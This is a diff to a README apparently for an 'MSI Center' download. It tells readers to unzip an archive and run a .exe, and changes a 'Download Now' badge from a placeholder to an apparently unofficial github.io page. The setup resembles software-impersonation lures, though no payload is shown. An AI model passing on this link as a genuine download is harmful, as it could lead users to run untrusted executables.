@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://msi-center.github.io/.github/)
 
 ## 📸 Overview
 ![msi-center-monitoring](https://github.com/user-attachments/assets/8f2ffe20-c03f-4d1c-b777-be318d6c0d68)
